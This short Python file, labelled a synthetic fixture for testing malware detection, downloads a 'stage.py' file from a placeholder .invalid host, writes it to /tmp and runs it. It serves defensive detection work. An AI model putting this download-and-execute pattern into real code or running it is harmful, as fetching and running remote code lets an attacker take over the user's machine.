# FIXTURE ONLY - synthetic detection test sample, not real malware
# A response is written to a file and that same file is started. Host is a .invalid domain.
import subprocess

import requests

payload = requests.get("https://dl.example.invalid/stage.py").content
open("/tmp/stage.py", "wb").write(payload)
subprocess.run(["python", "/tmp/stage.py"])
